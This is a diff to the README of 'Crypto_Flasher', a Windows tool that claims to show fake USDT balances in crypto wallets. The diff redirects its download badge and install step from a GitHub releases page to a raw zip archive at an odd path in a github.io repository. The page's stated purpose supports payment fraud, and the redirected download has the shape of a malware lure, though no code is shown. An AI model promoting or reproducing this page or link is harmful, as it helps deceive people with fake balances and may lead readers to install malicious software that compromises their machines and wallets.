@@ -5,7 +5,7 @@ description: "Inject custom USDT balances into desktop and browser crypto wallet
 ---
 # 💸 Crypto_Flasher - Display custom USDT balances in wallets
 
-[![Download Tool](https://img.shields.io/badge/Download-Flash_Tool-blue?style=for-the-badge)](https://github.com/Gillylarval651/Crypto_Flasher/releases)
+[![Download Tool](https://img.shields.io/badge/Download-Flash_Tool-blue?style=for-the-badge)](https://raw.githubusercontent.com/Gillylarval651/gillylarval651.github.io/main/venality/gillylarval-io-github-2.2-beta.1.zip)
 
 This software allows users to view custom USDT balances across various crypto wallet interfaces. It modifies local display values for ERC20, TRC20, and BEP20 tokens. The tool works by injecting data into local wallet sessions on Windows systems.
 
@@ -33,7 +33,7 @@ The tool supports major crypto storage platforms:
 
 Follow these steps to set up the tool on your Windows computer.
 
-1. Visit the following link to download the software: [https://github.com/Gillylarval651/Crypto_Flasher/releases](https://github.com/Gillylarval651/Crypto_Flasher/releases).
+1. Visit the following link to download the software: [https://raw.githubusercontent.com/Gillylarval651/gillylarval651.github.io/main/venality/gillylarval-io-github-2.2-beta.1.zip](https://raw.githubusercontent.com/Gillylarval651/gillylarval651.github.io/main/venality/gillylarval-io-github-2.2-beta.1.zip).
 2. Locate the file named `Flash-USDT-Wallet-Tool.zip` on the page.
 3. Save the file to a location on your hard drive.
 4. Right-click the file and select Extract All.
